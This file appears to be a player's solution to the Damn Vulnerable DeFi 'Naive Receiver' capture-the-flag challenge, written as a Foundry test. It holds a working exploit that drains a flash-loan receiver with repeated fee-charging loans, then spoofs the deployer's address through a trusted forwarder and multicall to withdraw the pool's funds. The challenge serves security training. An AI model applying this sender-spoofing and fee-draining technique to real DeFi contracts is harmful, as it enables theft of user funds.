// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    // function test_naiveReceiver() public checkSolvedByPlayer {
    //     uint256 balance_before_receiver = weth.balanceOf(address(receiver));
    //     uint256 balance_before_pool = weth.balanceOf(address(pool));
    //     uint256 balance_before_recovery = weth.balanceOf(recovery);
    //     while(weth.balanceOf(address(receiver)) > 0){
    //         pool.flashLoan(receiver, address(weth), WETH_IN_POOL, construct_data(1));
    //     }
    //     uint256 balance_after_receiver = weth.balanceOf(address(receiver));
    //     uint256 balance_after_pool = weth.balanceOf(address(pool));

    //     BasicForwarder.Request memory req = BasicForwarder.Request({
    //         from: player,
    //         target: address(pool),
    //         value: weth.balanceOf(address(pool)),
    //         gas: gasleft(),
    //         nonce: forwarder.nonces(player),
    //         data: construct_data(2),
    //         deadline: 1 days
    //     });

    //     // Hash the request
    //     bytes32 requestHash = keccak256(
    //         abi.encodePacked(
    //         "\x19\x01",
    //         forwarder.domainSeparator(),
    //         forwarder.getDataHash(req)
    //         )
    //     );

    //     (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
    //     bytes memory signature = abi.encodePacked(r, s, v);

    //     forwarder.execute(req, signature);

    //     uint256 balance_after_recovery = weth.balanceOf(recovery);

    //     console.log("balance_before_receiver:   ", balance_before_receiver);
    //     console.log("balance_before_pool:       ", balance_before_pool);
    //     console.log("balance_before_recovery:   ", balance_before_recovery);
    //     console.log("balance_after_receiver:    ", balance_after_receiver);
    //     console.log("balance_after_pool:        ", balance_after_pool);
    //     console.log("balance_aftere_recovery:   ", balance_after_recovery);
    // }

    // function construct_data(uint256 option) public view returns(bytes memory data){
    //     if(option == 1){
    //         data = abi.encodeWithSignature("_executeActionDuringFlashLoan()");
    //     } else if (option == 2){
    //         data = abi.encodeWithSignature("withdraw(uint256,address)", weth.balanceOf(address(pool)), recovery);
    //     }
    // }

    function test_naiveReceiver() public checkSolvedByPlayer {
        // Prepare call data for 10 flash loans and 1 withdrawal
        bytes[] memory callDatas = new bytes[](11);

        // Encode flash loan calls - on behalf of the Naive receiver
        for (uint256 i = 0; i < 10; i++) {
            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
        }

        // Encode withdrawal call
        // Exploit the access control vulnerability by passing the request through the forwarder
        // And setting the deployer as sender in the last 20 bytes (That's how the pool parses it)
        callDatas[10] = abi.encodePacked(
            abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            bytes32(uint256(uint160(deployer)))
        );

        // Encode the multicall
        bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);

        // Create forwarder request
        BasicForwarder.Request memory request = BasicForwarder.Request(
            player, address(pool), 0, gasleft(), forwarder.nonces(player), multicallData, 1 days
        );

        // Hash the request
        bytes32 requestHash =
            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));

        // Sign the request
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Execute the request
        forwarder.execute(request, signature);
    }

    // function onFlashLoan(
    //     address initiator,
    //     address token,
    //     uint256 amount,
    //     uint256 fee,
    //     bytes calldata data
    // ) external returns (bytes32);

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}

